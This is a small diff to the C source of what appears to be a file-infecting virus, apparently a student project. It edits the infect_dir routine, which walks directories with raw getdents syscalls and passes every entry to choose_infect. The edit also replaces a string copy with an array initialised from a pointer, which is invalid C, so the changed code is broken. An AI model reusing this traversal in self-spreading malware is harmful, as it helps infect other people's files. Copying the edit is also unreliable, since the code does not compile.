@@ -18,6 +18,7 @@ void	infect_dir(char *path)
 		#endif
 		int		nread;
 		char	buffer[1024];
+
 		/* Get files/directories inside */
 		while ((nread = syscall_getdents(fd, (struct linux_dirent *)buffer, 1024)) > 0)
 		{
@@ -29,9 +30,8 @@ void	infect_dir(char *path)
 				linux_dir = (void *)buffer + bpos;
 				if (ft_strcmp(linux_dir->d_name, ".") && ft_strcmp(linux_dir->d_name, ".."))
 				{
-					char new_path[MAX_PATH_LENGTH];
+					char new_path[MAX_PATH_LENGTH] = path;
 
-					ft_strcpy(new_path, path);
 					ft_strcat(new_path, "/");
 					ft_strcat(new_path, linux_dir->d_name);
 					choose_infect(new_path);
